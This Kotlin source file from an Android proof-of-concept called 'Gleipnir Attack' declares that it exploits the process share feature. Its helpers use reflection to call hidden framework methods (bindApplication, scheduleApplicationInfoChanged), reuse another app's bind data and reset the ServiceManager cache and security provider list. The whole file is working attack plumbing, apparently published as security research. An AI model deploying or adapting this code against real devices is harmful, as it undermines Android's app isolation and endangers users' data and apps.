/*
 * Gleipnir Attack POC - Exploiting the Android process share feature
 * Copyright (C) <2020>  <Sascha Roth>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

package org.gleipnir.app.helpers.extensions

import android.content.ComponentName
import android.content.pm.ApplicationInfo
import android.content.pm.PackageInfo
import android.content.res.Configuration
import android.os.Bundle
import android.os.IBinder
import org.gleipnir.app.reflectionHelper.getDeclaredConstructor
import org.gleipnir.app.reflectionHelper.getDeclaredMethod
import org.gleipnir.app.reflectionHelper.getReflective
import java.lang.reflect.Constructor
import java.lang.reflect.Method
import java.util.*


fun scheduleApplicationInfoChanged(applicationThread: Any, applicationInfo: ApplicationInfo) {

    val scheduleApplicationInfoChangedMethod = getDeclaredMethod(
        applicationThread::class.java, "scheduleApplicationInfoChanged",
        ApplicationInfo::class.java

    ) as Method
    scheduleApplicationInfoChangedMethod.isAccessible = true
    scheduleApplicationInfoChangedMethod.invoke(applicationThread, applicationInfo)
}

fun resetServiceManager() {
    val sCacheField =
        Class.forName("android.os.ServiceManager")
            .getDeclaredField("sCache")//new ArrayMap<String, IBinder>()
    sCacheField.isAccessible = true
    sCacheField.set(null, HashMap<String, IBinder>())


    val providerListConstructor = getDeclaredConstructor(
        Class.forName("sun.security.jca.ProviderList"), arrayOfNulls<Class<Any>>(0)
    ) as Constructor<Any>
    providerListConstructor.isAccessible = true
    val method = getDeclaredMethod(
        Class.forName("sun.security.jca.Providers"),
        "setProviderList",
            Class.forName("sun.security.jca.ProviderList")

    ) as Method
    method.invoke(null, providerListConstructor.newInstance())
}


fun bindApplication(
    applicationThread: Any,
    packageInfo: PackageInfo,
    processName: String,
    sourceAppBindData: Any
) {


    val component = getReflective<ComponentName>(sourceAppBindData, "instrumentationName")
    val profiler = getReflective<Any>(sourceAppBindData, "initProfilerInfo")
    val instrumentationArgs = getReflective<Any>(sourceAppBindData, "instrumentationArgs")
    val instrumentationWatcher = getReflective<Any>(sourceAppBindData, "instrumentationWatcher")
    val instrumentationUiConnection =
        getReflective<Any>(sourceAppBindData, "instrumentationUiAutomationConnection")
    val debugMode: Int = 0
    val enableBinderTracking = false
    val trackAllocation = false
    val isRestrictedBackupMode = false
    val persistent = false
    val config = getReflective<Any>(sourceAppBindData, "config")
    val compatibilityMode = getReflective<Any>(sourceAppBindData, "compatInfo")
    val coreSettings = Bundle()
    val buildSerial = ""
    val autofillOptions = getReflective<Any>(sourceAppBindData, "autofillOptions")
    val contentCaptureOptions = getReflective<Any>(sourceAppBindData, "contentCaptureOptions")
    val disabledCompatChanges = arrayOf(0L)

    //packageInfo.services
    val services: Map<Any, Any> = HashMap()

    val bindApplicationMethod =
        getDeclaredMethod(
            applicationThread::class.java, "bindApplication",
                String::class.java,
                ApplicationInfo::class.java,
                List::class.java,
                ComponentName::class.java,
                Class.forName("android.app.ProfilerInfo"),
                Bundle::class.java,
                Class.forName("android.app.IInstrumentationWatcher"),
                Class.forName("android.app.IUiAutomationConnection"),
                java.lang.Integer.TYPE,
                java.lang.Boolean.TYPE,
                java.lang.Boolean.TYPE,
                java.lang.Boolean.TYPE,
                java.lang.Boolean.TYPE,
                Configuration::class.java,
                compatibilityMode!!::class.java,
                Map::class.java,
                Bundle::class.java,
                buildSerial::class.java,
                autofillOptions!!::class.java,
                Class.forName("android.content.ContentCaptureOptions")
        ) as Method
    bindApplicationMethod.isAccessible = true

    // reset stuff
    resetServiceManager()
    // call it
    bindApplicationMethod.invoke(
        applicationThread,
        processName,
        packageInfo.applicationInfo,
        //Arrays.asList(packageInfo.providers),
        listOf<ComponentName>(),
        component,
        profiler,
        instrumentationArgs,
        instrumentationWatcher,
        instrumentationUiConnection,
        debugMode,
        enableBinderTracking,
        trackAllocation,
        isRestrictedBackupMode,
        persistent,
        config,
        compatibilityMode,
        services,
        coreSettings,
        buildSerial,
        autofillOptions,
        contentCaptureOptions


    )


}